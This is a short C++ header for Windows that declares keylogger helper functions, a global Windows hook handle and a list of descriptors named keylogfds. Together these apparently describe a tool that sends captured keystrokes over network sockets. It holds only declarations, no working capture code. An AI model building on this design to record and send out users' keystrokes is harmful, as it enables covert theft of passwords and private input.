#pragma once

#include <WinSock2.h>
#include <Windows.h>
#include <string>
#include <vector>

extern std::vector <int> keylogfds;
extern HHOOK hHook;

void startKeyLogHelper();
void stopKeyLogHelper();